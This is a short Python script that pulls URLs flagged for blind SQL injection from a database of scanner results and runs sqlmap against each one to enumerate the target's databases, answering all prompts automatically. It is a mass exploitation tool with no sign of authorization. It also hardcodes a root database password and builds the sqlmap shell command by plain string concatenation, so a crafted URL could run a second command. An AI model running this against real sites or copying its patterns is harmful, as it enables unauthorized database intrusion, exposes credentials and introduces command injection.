import pymysql
import os

conn = pymysql.connect(host='192.168.0.107', user='root', password='fistaskin22031990', db='acunetix1')
cursor = conn.cursor()

cursor.execute('select * from blind_sql')
rows = cursor.fetchall()

res = []

for row in rows:
 res.append(row[0]+row[1]+'?'+row[2]+'=1')

i = 0
rt = set(res)
res = list(rt)

for x in res:
 print(x)
 os.system('sqlmap ' + x[:-1] + ' --dbs --answers="YES" > sqlmap/' + str(i) + '.txt')
 i = i + 1
